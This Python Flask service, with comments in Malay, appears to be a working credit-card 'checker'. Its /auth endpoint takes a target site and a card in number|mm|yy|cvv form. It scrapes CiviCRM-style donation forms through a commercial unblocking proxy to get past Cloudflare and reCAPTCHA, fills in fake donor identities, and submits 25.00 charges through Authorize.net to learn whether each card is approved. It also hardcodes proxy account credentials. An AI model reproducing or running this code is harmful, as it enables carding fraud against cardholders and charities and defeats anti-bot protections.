from flask import Flask, request, jsonify
from datetime import datetime
import random
import requests
import logging
import re
import time
import os
import string
import ssl
import urllib3
from urllib3.util.ssl_ import create_urllib3_context
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

requests.packages.urllib3.util.connection.HAS_IPV6 = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

class Colors:
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

logging.basicConfig(level=logging.INFO, format='%(message)s', datefmt='%H:%M:%S')

VALID_YEARS = list(range(2025, 2036))
TIMEOUT_SECONDS = 45 # Bright Data Web Unlocker mungkin ambil sikit lama untuk bypass

class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

def generate_random_user_data():
    first_names = ["John", "Sarah", "Michael", "Emily", "David", "Jessica", "James", "Lauren", "Robert", "Maria", "William", "Jennifer", "Richard", "Linda", "Joseph", "Patricia"]
    last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Harris", "Miller", "Moore", "Anderson", "Thomas", "Jackson", "White", "Martin"]
    email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com", "icloud.com"]
    city_state_zip = [
        ["New York", "New York", "10001", "1000"], ["Los Angeles", "California", "90001", "1004"],
        ["Chicago", "Illinois", "60601", "1012"], ["Houston", "Texas", "77001", "1042"],
        ["Phoenix", "Arizona", "85001", "1002"], ["Philadelphia", "Pennsylvania", "19101", "1043"],
        ["San Antonio", "Texas", "78201", "1042"], ["San Diego", "California", "92101", "1004"],
        ["Dallas", "Texas", "75201", "1042"], ["San Jose", "California", "95101", "1004"],
    ]
    street_names = ["Main St", "Oak Ave", "Elm St", "Maple Dr", "Cedar Ln", "Pine St", "Washington Ave", "Lake St", "Park Ave", "River Rd"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    middle_name = random.choice(first_names)[0]
    email_prefix = f"{first_name.lower()}{random.randint(1000,9999)}"
    email = f"{email_prefix}@{random.choice(email_domains)}"
    loc = random.choice(city_state_zip)
    city, postal_code, state_id = loc[0], loc[2], loc[3]
    street_address = f"{random.randint(100, 9999)} {random.choice(street_names)}"
    phone = f"{random.randint(200,999)}-{random.randint(200,999)}-{random.randint(1000,9999)}"
    username = f"{email_prefix}{random.randint(10,99)}"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    
    return {'first_name': first_name, 'last_name': last_name, 'middle_name': middle_name, 'email': email, 'city': city, 'postal_code': postal_code, 'state_id': state_id, 'street_address': street_address, 'phone': phone, 'username': username, 'password': password}

def clean_card_number(ccnum): return re.sub(r'\D', '', ccnum)

def get_card_type(ccnum):
    ccnum = clean_card_number(ccnum)
    if ccnum.startswith('4'): return "Visa"
    elif ccnum.startswith('5') and len(ccnum) == 16: return "MasterCard"
    elif ccnum.startswith('3') and len(ccnum) in [15, 16]:
        if ccnum.startswith('34') or ccnum.startswith('37'): return "Amex"
    elif ccnum.startswith('6'): return "Discover"
    return "Unknown"

def create_session(proxy_url=None):
    session = requests.Session()
    session.mount('https://', IgnoreSSLAdapter())
    session.mount('http://', IgnoreSSLAdapter())
    
    # Setup Bright Data Web Unlocker Proxy
    bd_user = os.environ.get("BRIGHTDATA_USERNAME", "brd-customer-hl_e3d7b03f-zone-web_unlocker1")
    bd_pass = os.environ.get("BRIGHTDATA_PASSWORD", "nlxp7dqlf4r1")
    bd_host = "brd.superproxy.io"
    bd_port = "33335"
    
    brightdata_proxy = f"http://{bd_user}:{bd_pass}@{bd_host}:{bd_port}"
    
    # Kita override parameter proxy kalau ada, sebab Web Unlocker kena guna dia punya proxy sendiri
    session.proxies = {"http": brightdata_proxy, "https": brightdata_proxy}
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    }
        
    session.headers.update(headers)
        
    return session

def detect_payment_processor(html):
    processors = {'authorize': ['authorize.net', 'authorize', 'paymentech', 'cybersource'], 'stripe': ['stripe', 'stripe.js', 'stripe.com', 'v3/stripe'], 'paypal': ['paypal', 'paypal.com']}
    detected = []
    for pattern in [r'authorize\.net', r'Authorize\.Net', r'payment gateway authorize', r'authorizenet']:
        if re.search(pattern, html, re.I): detected.append('authorize'); break
    auth_fields = ['credit_card_number', 'cvv2', 'credit_card_exp_date']
    if sum(1 for field in auth_fields if re.search(r'name=["\']?' + re.escape(field) + r'["\']?', html, re.I)) >= 2 and 'authorize' not in detected: detected.append('authorize')
    if 'authorize' not in detected:
        for pattern in [r'stripe\.com', r'stripe\.js', r'js\.stripe\.com']:
            if re.search(pattern, html, re.I): detected.append('stripe'); break
    return detected

def extract_raw_fields(html, soup, form):
    payload = {}
    inputs = form.find_all('input')
    
    submit_button_name = None
    submit_button_value = None
    for inp in inputs:
        if inp.get('type') in ['submit', 'button']:
            name = inp.get('name')
            if name and '_qf_' in name:
                submit_button_name = name
                submit_button_value = inp.get('value', '1')
                break
    if not submit_button_name:
        submit_button_name = "_qf_Main_upload"
        submit_button_value = "1"
    
    payload['_submit_button_name'] = submit_button_name
    payload['_submit_button_value'] = submit_button_value

    for inp in inputs:
        name = inp.get('name')
        input_type = inp.get('type', 'text')
        value = inp.get('value', '')
        required = inp.get('required', False)
        if name:
            if input_type == 'radio':
                if name not in payload: payload[name] = {'value': value, 'type': input_type, 'required': required, 'options': []}
                if value and value not in payload[name]['options']: payload[name]['options'].append(value)
                if inp.get('checked'): payload[name]['value'] = value
            else:
                payload[name] = {'value': value, 'type': input_type, 'required': required}
    
    for sel in form.find_all('select'):
        name = sel.get('name')
        if name:
            options = sel.find_all('option')
            option_values = [opt.get('value', '') for opt in options] if options else []
            default_value = sel.find('option', selected=True).get('value', '') if sel.find('option', selected=True) else (options[0].get('value', '') if options else '')
            payload[name] = {'value': default_value, 'type': 'select', 'required': sel.get('required', False), 'options': option_values}
    
    for txt in form.find_all('textarea'):
        name = txt.get('name')
        if name: payload[name] = {'value': txt.get_text(strip=True), 'type': 'textarea', 'required': txt.get('required', False)}
    
    payment_processor_id = None
    for inp in inputs:
        if inp.get('type') == 'radio' and 'payment_processor' in inp.get('name', '').lower():
            value = inp.get('value', '')
            label = inp.find_next('label') if inp.find_next('label') else None
            label_text = label.get_text(strip=True) if label else ''
            if 'authorize' in label_text.lower() or 'authorize' in str(value).lower():
                payment_processor_id = value; break
            elif not payment_processor_id: payment_processor_id = value
    if not payment_processor_id:
        for inp in inputs:
            if inp.get('type') == 'hidden' and 'payment_processor' in inp.get('name', '').lower() and inp.get('value'):
                payment_processor_id = inp.get('value'); break
    if payment_processor_id: payload['_detected_payment_processor_id'] = {'value': payment_processor_id, 'type': 'detected'}
    return payload

def get_form_action_and_payload(session, url):
    try:
        logging.info(f"{Colors.OKCYAN}[*] Requesting site via Bright Data Web Unlocker...{Colors.ENDC}")
        
        # Web Unlocker akan handle cloudflare & recaptcha secara automatik
        resp = session.get(url, timeout=45, allow_redirects=True)
        
        if resp.status_code != 200 or not resp.text:
            return None, None, None, None, f"Bad HTTP {resp.status_code}"
            
        html = resp.text
        
        # Web Unlocker selalunya akan inject token recaptcha dalam hidden input
        # atau kita just hantar je kosong sebab dia dah bypass
        
        processors = detect_payment_processor(html)
        has_authorize = 'authorize' in processors
        if 'stripe' in processors: return None, None, None, None, "Stripe Detected"
        if not has_authorize and processors: return None, None, None, None, "Other Processor"
        
        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form', id=re.compile(r'Main|main|Contribution', re.I)) or soup.find('form', class_=re.compile(r'crm|contribute', re.I)) or soup.find('form')
        if not form: return None, None, None, None, "Form not found"
        
        form_action = form.get('action') or re.search(r'<form[^>]*action="([^"]+)"', html).group(1) if re.search(r'<form[^>]*action="([^"]+)"', html) else None
        if form_action and not form_action.startswith('http'): form_action = urljoin(url, form_action)
        if not form_action: return None, None, None, None, "Form action not found"
        
        qfkey = None
        for pattern in [r'name="qfKey"\s+value="([^"]+)"', r'name="qfKey"\s*type="hidden"\s*value="([^"]+)"', r'qfKey=([a-zA-Z0-9]+)']:
            match = re.search(pattern, html)
            if match: qfkey = match.group(1); break
        
        payload = extract_raw_fields(html, soup, form)
        
        # Kalau ada hidden input g-recaptcha-response, biarkan Web Unlocker handle
        # Biasanya Web Unlocker akan auto-isi input ni

        return qfkey, form_action, payload, has_authorize, "OK"
        
    except Exception as e:
        error_name = type(e).__name__
        if 'Timeout' in error_name or 'ConnectError' in error_name or 'ConnectionError' in error_name or 'ProxyError' in error_name:
            return None, None, None, None, "BrightData Timed out or Proxy Error"
            
        return None, None, None, None, "Failed to fetch"

def parse_response(html, url):
    soup = BeautifulSoup(html, 'html.parser')
    
    msg_text_span = soup.find('span', class_='msg-text')
    if msg_text_span:
        error_text = msg_text_span.get_text(strip=True)
        if "Payment Processor Error message:" in error_text: error_text = error_text.split("Payment Processor Error message:")[-1].strip()
        if "Payment Response:" in error_text: error_text = error_text.split("Payment Response:")[-1].strip()
        error_text = re.sub(r'\s+', ' ', error_text).strip()
        if error_text and len(error_text) > 3:
            return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
    
    status_div = soup.find('div', class_=re.compile(r'status|alert|error', re.I))
    if status_div:
        error_text = status_div.get_text(strip=True)
        error_text = re.sub(r'\s+', ' ', error_text).strip()
        if error_text and len(error_text) > 3 and 'decline' in error_text.lower():
            return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
    
    if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
        return {'approved': True, 'has_msg': False, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
    
    if '_qf_Confirm_display=true' in url or '_qf_Confirm_display=1' in url:
        return {'approved': False, 'has_msg': False, 'message': 'Confirmation page', 'clean_response': '', 'is_confirmation': True}
    
    return {'approved': False, 'has_msg': False, 'message': 'Transaction declined (No specific reason found)', 'clean_response': 'No specific reason found'}

def process_site_for_payload(url):
    session = create_session()
    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url)
    
    if err_msg != "OK":
        session.close()
        return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None}
    
    if not qfkey or not form_action:
        session.close()
        return {'url': url, 'status': 'failed', 'payload': None, 'session': None}
    
    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session}

def extract_confirmation_form(html, soup):
    confirm_form = soup.find('form', id=re.compile(r'Confirm|confirm', re.I))
    if not confirm_form:
        confirm_form = soup.find('form', class_=re.compile(r'confirm', re.I))
    if not confirm_form:
        for form in soup.find_all('form'):
            if form.find('input', {'name': '_qf_Confirm_next'}) or form.find('button', {'name': '_qf_Confirm_next'}):
                confirm_form = form
                break
    if not confirm_form:
        for form in soup.find_all('form'):
            qf_default = form.find('input', {'name': '_qf_default'})
            if qf_default and 'confirm' in qf_default.get('value', '').lower():
                confirm_form = form
                break

    if confirm_form:
        form_id = confirm_form.get('id', '')
        form_class = confirm_form.get('class', [])
        form_action = confirm_form.get('action', '')
        if 'search' in str(form_id).lower() or any('search' in str(c).lower() for c in form_class) or 'search' in str(form_action).lower():
            confirm_form = None

    if not confirm_form:
        return None

    payload = {}
    inputs = confirm_form.find_all('input')
    for inp in inputs:
        name = inp.get('name')
        input_type = inp.get('type', 'text')
        value = inp.get('value', '')
        if name:
            payload[name] = {'value': value, 'type': input_type}
    return payload

def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False):
    scheme = get_card_type(ccnum)
    full_year = f"20{yy}" if len(yy) == 2 else yy
    input_month = int(mm)

    final_payload = {}
    
    final_payload["qfKey"] = qfkey
    final_payload["entryURL"] = base_url.replace("&amp;", "&")
    if is_confirm:
        final_payload["_qf_default"] = "Confirm:next"
        final_payload["_qf_Confirm_next"] = "1"
    else:
        final_payload["_qf_default"] = "Main:upload"
        submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
        final_payload[submit_name] = raw_payload.get('_submit_button_value', '1')

    if '_detected_payment_processor_id' in raw_payload:
        proc_id = raw_payload['_detected_payment_processor_id'].get('value', '1')
        final_payload['payment_processor_id'] = proc_id

    price_selected = False

    for key, field_info in raw_payload.items():
        if key in ['_detected_payment_processor_id', '_form_action', '_submit_button_name', '_submit_button_value']: continue
        if not isinstance(field_info, dict): continue

        field_type = field_info.get('type', 'text')
        options = field_info.get('options', [])
        current_value = field_info.get('value', '')
        key_lower = key.lower()

        if 'stripe' in key_lower or 'paypal' in key_lower: continue
        if field_type in ['submit', 'button', 'image']: continue
        if current_value in ['null', None]: continue

        if field_type == 'radio' or field_type == 'checkbox':
            if 'price' in key_lower or 'amount' in key_lower:
                if not price_selected:
                    try:
                        val_float = float(current_value) if current_value else 0.0
                        if val_float > 10.0:
                            final_payload[key] = '0'
                        else:
                            final_payload[key] = "25.00"
                            price_selected = True
                    except:
                        final_payload[key] = "25.00"
                        price_selected = True
                else:
                    final_payload[key] = '0'
            else:
                if 'organization' in key_lower: final_payload[key] = ''
                elif 'recurring' in key_lower or 'recur' in key_lower: final_payload[key] = '0'
                else: final_payload[key] = current_value
            continue

        if field_type == 'select':
            if 'state' in key_lower or 'province' in key_lower: final_payload[key] = user_data['state_id']
            elif 'country' in key_lower: final_payload[key] = '1228'
            elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
            elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
            elif 'price' in key_lower or 'amount' in key_lower:
                if not price_selected:
                    try:
                        val_float = float(current_value) if current_value else 0.0
                        if val_float > 10.0:
                            final_payload[key] = '0'
                        else:
                            final_payload[key] = "25.00"
                            price_selected = True
                    except:
                        final_payload[key] = "25.00"
                        price_selected = True
                else:
                    final_payload[key] = '0'
            else:
                if options: final_payload[key] = options[0]
            continue

        if field_type == 'hidden':
            if isinstance(current_value, str) and current_value:
                final_payload[key] = current_value.replace("&amp;", "&")
            continue

        if 'card' in key_lower and ('number' in key_lower or 'no' in key_lower or 'num' in key_lower): final_payload[key] = ccnum
        elif 'cvv' in key_lower or 'cvc' in key_lower or 'cid' in key_lower or ('security' in key_lower and 'code' in key_lower): final_payload[key] = cvv
        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
        elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
        elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
        
        elif 'frequency' in key_lower and 'interval' in key_lower: final_payload[key] = "1"
        elif 'recur' in key_lower and 'interval' in key_lower: final_payload[key] = "1"
        elif 'installments' in key_lower: final_payload[key] = "0"
        elif 'frequency_unit' in key_lower: final_payload[key] = current_value
        
        elif 'first' in key_lower and 'name' in key_lower: final_payload[key] = user_data['first_name']
        elif 'last' in key_lower and 'name' in key_lower: final_payload[key] = user_data['last_name']
        elif 'middle' in key_lower and 'name' in key_lower: final_payload[key] = user_data['middle_name']
        elif 'email' in key_lower: final_payload[key] = user_data['email']
        elif 'street' in key_lower or 'address' in key_lower or 'addr1' in key_lower or 'line_1' in key_lower: final_payload[key] = user_data['street_address']
        elif 'city' in key_lower: final_payload[key] = user_data['city']
        elif 'zip' in key_lower or 'postal' in key_lower: final_payload[key] = user_data['postal_code']
        elif 'phone' in key_lower or 'tel' in key_lower or 'mobile' in key_lower: final_payload[key] = user_data['phone']
        elif 'pass' in key_lower or 'pwd' in key_lower: final_payload[key] = user_data['password']
        elif 'user' in key_lower or 'login' in key_lower: final_payload[key] = user_data['username']
        elif 'employer' in key_lower or 'occupation' in key_lower or 'affiliation' in key_lower or 'position' in key_lower or 'profession' in key_lower: final_payload[key] = "Self Employed"
        elif 'price' in key_lower or 'amount' in key_lower:
            if not price_selected:
                try:
                    val_float = float(current_value) if current_value else 0.0
                    if val_float > 10.0:
                        final_payload[key] = "0"
                    else:
                        final_payload[key] = "25.00"
                        price_selected = True
                except:
                    final_payload[key] = "25.00"
                    price_selected = True
            else:
                final_payload[key] = "0"
        else:
            if not current_value:
                continue
            final_payload[key] = current_value

    return final_payload

def process_card_on_site(site_data, ccnum, mm, yy, cvv):
    base_url, raw_payload, form_action, qfkey = site_data['url'], site_data['payload'], site_data['form_action'], site_data['qfkey']
    session = site_data.get('session')
    
    ccnum = clean_card_number(ccnum)
    user_data = generate_random_user_data()

    detected_price = 0.0
    for key, field_info in raw_payload.items():
        if not isinstance(field_info, dict): continue
        key_lower = key.lower()
        if 'price' in key_lower or 'amount' in key_lower:
            val = field_info.get('value', '0')
            try:
                p = float(val)
                if p > 0:
                    detected_price = p
                    break
            except:
                pass

    for attempt in range(3):
        try:
            if 'qfKey=' in form_action and f'qfKey={qfkey}' not in form_action:
                form_action = re.sub(r'qfKey=[a-zA-Z0-9]+', f'qfKey={qfkey}', form_action)
            elif 'qfKey=' not in form_action:
                if '?' in form_action: form_action += f'&qfKey={qfkey}'
                else: form_action += f'?qfKey={qfkey}'

            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False)

            origin_url = urlparse(base_url).scheme + "://" + urlparse(base_url).netloc
            session.headers.update({
                "Referer": base_url,
                "Origin": origin_url,
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Upgrade-Insecure-Requests": "1"
            })

            # Kiranya hantar data CC melalui Bright Data jugak
            response = session.post(form_action, data=clean_initial, timeout=45, allow_redirects=True)

            soup_resp = BeautifulSoup(response.text, 'html.parser')

            confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
            is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
            
            if confirm_btn or is_confirmation:
                input_qfkey = soup_resp.find('input', {'name': 'qfKey'})
                if input_qfkey: qfkey = input_qfkey.get('value', qfkey)

                confirm_hidden = extract_confirmation_form(response.text, soup_resp)
                
                merged_payload = raw_payload.copy()
                if confirm_hidden:
                    for k, v in confirm_hidden.items():
                        merged_payload[k] = v

                clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
                confirm_response = session.post(form_action, data=clean_confirm, timeout=45, allow_redirects=True)
                
                if confirm_response.status_code == 500:
                    result = {'approved': False, 'has_msg': True, 'message': 'Site Error / Not Authorize', 'clean_response': 'Site Error'}
                    if session: session.close()
                    return result, detected_price
                
                result = parse_response(confirm_response.text, confirm_response.url)
            else:
                result = parse_response(response.text, response.url)

            if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
                if attempt < 2:
                    if session: session.close()
                    site_data = process_site_for_payload(base_url)
                    if site_data['status'] != 'success': return False, detected_price
                    raw_payload, form_action, qfkey = site_data['payload'], site_data['form_action'], site_data['qfkey']
                    session = site_data['session']
                    time.sleep(1); continue
                else:
                    if session: session.close()
                    return result, detected_price

            if session: session.close()
            return result, detected_price
            
        except Exception as e:
            if session: session.close()
            return {'approved': False, 'message': str(e), 'clean_response': ''}, detected_price

@app.route('/auth', methods=['GET'])
def handle_auth():
    start_time = time.time()
    
    site = request.args.get('site')
    id_param = request.args.get('id')
    if site and id_param and 'id=' not in site:
        site = f"{site}&id={id_param}"

    cc_param = request.args.get('cc')
    proxy_param = request.args.get('proxy')

    if not site or not cc_param:
        return jsonify({"error": "Missing 'site' or 'cc' parameter"}), 400

    try:
        parts = cc_param.split('|')
        if len(parts) != 4:
            return jsonify({"error": "Invalid 'cc' format. Expected: number|mm|yy|cvv"}), 400
        cc, mm, yy, cvv = parts
    except Exception as e:
        return jsonify({"error": "Error parsing 'cc' parameter: " + str(e)}), 400

    try:
        site_data = process_site_for_payload(site)
        
        if site_data['status'] == 'success':
            result, detected_price = process_card_on_site(site_data, cc, mm, yy, cvv)
            
            if not result:
                result = {'approved': False, 'message': 'Failed to process site data.', 'clean_response': 'Failed'}
        else:
            result = {'approved': False, 'message': site_data['status'], 'clean_response': site_data['status']}
            detected_price = 0.0
            
    except Exception as e:
        result = {'approved': False, 'message': 'Server exception: ' + str(e), 'clean_response': 'Server exception'}
        detected_price = 0.0

    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    result_status = "Approved" if result.get('approved', False) else "Declined"
    
    response_msg = result.get('message', 'Unknown Error')
    if "Payment Processor Error message :" in response_msg:
        response_msg = response_msg.replace("Payment Processor Error message :", "").strip()

    return jsonify({
        "Gateway": "Authorized.net",
        "Price": detected_price,
        "Result": result_status,
        "Response": response_msg,
        "Status": result.get('approved', False),
        "Time": f"{time_taken}s",
        "cc": cc_param
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
